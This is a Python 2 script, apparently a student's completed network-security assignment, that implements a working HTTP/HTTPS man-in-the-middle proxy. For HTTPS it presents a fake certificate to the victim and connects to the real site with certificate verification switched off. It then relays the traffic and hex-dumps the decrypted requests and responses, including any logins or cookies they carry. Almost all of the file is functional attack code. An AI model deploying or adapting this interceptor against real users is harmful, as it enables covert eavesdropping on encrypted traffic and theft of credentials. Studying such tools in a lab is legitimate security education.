#!/usr/bin/env python

from socket import *
import ssl
import threading
import time
import re 
import httplib
import struct
import string
import os
import sys

class handler(threading.Thread):
    def __init__(self,socket, port):
        threading.Thread.__init__(self)
        # A flag to denote ssl state
        self.http_type = ""
        self.destination = None
        self.sslenable = False
        self.dest_socket = None
        self.from_socket = socket
        self.dest_ssl_socket = None
        self.from_ssl_socket = None

    def initSSLConnection(self):
        # Use your fake certificate to establish connection to victim
        # This function should use 
        # 1. send back "HTTP/1.1 200 Connection established\r\n\r\n"
        # 2. use  ssl.wrap_socket to establish ssl-wrap socket connect to victim(use fake certificate)
        # 3. return the ssl-wrap socket 
        # ======== Your Code Here!! =======================
        """
        data =  ssl.get_server_certificate(self.destination)
        cert = open("/tmp/ca_cert", "w")
        print data
        cert.write(data)
        cert.close()
        self.dest_ssl_socket = ssl.wrap_socket(self.dest_socket, ca_certs = "/tmp/ca_cert", cert_reqs = ssl.REQUIRED)
        """
        self.dest_ssl_socket = ssl.wrap_socket(self.dest_socket, cert_reqs = ssl.CERT_NONE)

        # need to reply from_socket
        print "DO CLIENT HANDSHAKE"
        self.from_socket.send(self.http_type + " 200 Connection established\r\n\r\n")
        self.from_ssl_socket = ssl.wrap_socket(self.from_socket, server_side = True, certfile = "/home/davis/mitm.crt", keyfile = "/home/davis/mitm.key")
        return

    def CreateSocketAndConnectToOriginDst(self):
        # if the port is not 443(http), create socket dirrect connect to the original website
        # if port is 443, create ssl.wrap_socket socket and connect to origin website
        # return the socket or wrap socket
        # ======== Your Code Here!! =======================
        self.dest_socket = socket(AF_INET, SOCK_STREAM)
        if self.sslenable:
            self.initSSLConnection()
            print "DO SERVER HANDSHAKE"
            self.dest_ssl_socket.connect(self.destination)
        else:
            self.dest_socket.connect(self.destination)
            pass
        return

    def ReadLine(self, SourceSock):
        # This function read a line from socket
        line = ""
        while True:
            char = SourceSock.recv(1)
            line += char
            if line.find("\r\n") != -1:
                return line

    def ReadNum(self, SourceSock, length):
        # read data with lenth from SourceSock
        line = ""
        while len(line) < length:
            char = SourceSock.recv(1)
            line += char
        return line

    def ReadHeader(self, SourceSock):
        #This function read the http header from socket
        #print "[Header]"
        header = ""
        line = self.ReadLine(SourceSock)
        while True:
            if line.find("\r\n") != -1:
                header += line
            if line == "\r\n":
                break
            line = self.ReadLine(SourceSock)

        dicHeader = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", header))
        #print header
        return dicHeader, header

    def ReadHttp(self, SourceSock):
        # Read whole Http packet, and return header and body in string type
        dicHeader, header = self.ReadHeader(SourceSock)
        body = ""
        if 'Transfer-Encoding' in dicHeader and dicHeader['Transfer-Encoding'] == 'chunked' :
            while True :
                line = self.ReadLine(SourceSock)
                body += line
                chunkSize = int(line, 16)
                if chunkSize == 0 : 
                    break
                line = self.ReadNum(SourceSock, chunkSize + 2)
                body += line
        else :
            if 'Content-Length' in dicHeader :
                length = int(dicHeader['Content-Length'])
            else :
                length = 0

            while length > 0 :
                line = SourceSock.recv(1)
                length -= len(line)
                body += line
        self.PrinfContent(body)
        return dicHeader, header, body

    def PrinfContent(self,content):
        print '[Content]'
        index = 0
        part = 0x10

        while index < len(content) :
            length = part if len(content)-index >= part else len(content)-index
            print "%08d" % index ,
            for i in range(index, index + length, 2):
                print content[i:i + 2].encode('hex').upper(),
            if length != part:
                temp_length = length
                if length % 2 == 1:
                    print '  ',
                    temp_length += 1
                for i in range(temp_length, part, 2):
                    print '    ',
            print_str=""
            for i in range(index, index + length):
                if content[i] not in string.printable or content[i] in {'\n','\r','\t'}:
                    print_str += '.'
                else:
                    print_str += content[i]
            print print_str
            index += length

    def getHostFromHeader(self, dicHeader, header):
        # Parsing first http packet and find 
        # 1) if ssl enable, if header contain "CONNECT 192.168.6.131:443 HTTP/1.1"
        #  then it is https connection, and port and host are return    
        # 2) port need to connect
        # 3) host need to connect
        # ==============Your Code Here !! ====================================
        port = ""
        if dicHeader["Host"].find(":") != -1:
            host, port = dicHeader["Host"].split(":")
        else:
            host = dicHeader["Host"] 
        dictRequest = re.findall(r"(?P<method>.*?) (?P<destination>.*?) (?P<potocol>HTTP.*?)", header.split("\r\n")[0])[0]
        if dictRequest[0] == "CONNECT":
            self.http_type = dictRequest[2] 
            self.sslenable = True
        if port == "":
            if self.sslenable:
                port = "443"    
            else: 
                port = "80"
        return host, port 

    def run(self):
        # The main function for MITM
        # You need to do 
        # 1. read http request sent from victim, and use getHostFromHeader to reveal host and port of target website
        # 2. if ssl is enabled, you should use initSSLConnection() to create ssl wrap socket 
        # 3. create a fakeSocket and connect to website which victim want to connect
        # ==============Your Code Here !! ====================================
        dicHeader, header, body = self.ReadHttp(self.from_socket)
        host, port = self.getHostFromHeader(dicHeader, header)
        print "Host: " + host + " Port: " + port + " SSL: " + str(self.sslenable)
        self.destination = (host, int(port))
        self.CreateSocketAndConnectToOriginDst()
       
        print "==================== Client Request  ================================"
        # 4. Forward the request sent by user to the fakeSocket
        # ==============Your Code Here !! ====================================
        #print "[Request]"
        if self.sslenable:
            data = self.from_ssl_socket.read()
            print data#.split("\r\n")[0]
            self.dest_ssl_socket.write(data)
            dicHeader = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", data))
        else:
            print header#.split("\r\n")[0]
            self.dest_socket.send(header + body)
        print "Client Request Forwarding Success"
        
        print "==================== server response  ================================"
        # 5. Read response from fakeSocket and forward to victim's socket
        # 6. close victim's socket and fakeSocket
        # ==============Your Code Here !! ====================================
        #print "[Response]"
        data = ""
        if self.sslenable:
            while True:
                data = self.dest_ssl_socket.read()
                if len(data) != 0:
                    print self.PrinfContent(data)
                    self.from_ssl_socket.write(data)
                else:
                    break
            self.dest_ssl_socket.close()
            self.from_ssl_socket.shutdown(SHUT_RDWR)
            self.from_ssl_socket.close()
        else:
            while True:
                data = self.dest_socket.recv(4096)
                if len(data) != 0:
                    print self.PrinfContent(data)
                    self.from_socket.send(data)
                else:
                    break
            self.dest_socket.close()
            self.from_socket.shutdown(SHUT_RDWR)
            self.from_socket.close()
        print "Connection Finished"

if len(sys.argv) == 3 :
    print "This program is Template of Proxy Level MITM Attack"
    print "This program is part of Network Security Project"
else:
    print "Usage: python mitm.py <your address> <port>"
    sys.exit()

ip = sys.argv[1]
port = int(sys.argv[2])
bindAddress = (ip, port)

serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(bindAddress)
serverSocket.listen(1)
threads = []
data_dir = "/home/davis/Desktop/"

while True :
    clientSocket,addr = serverSocket.accept()
    handler(clientSocket, port).start()


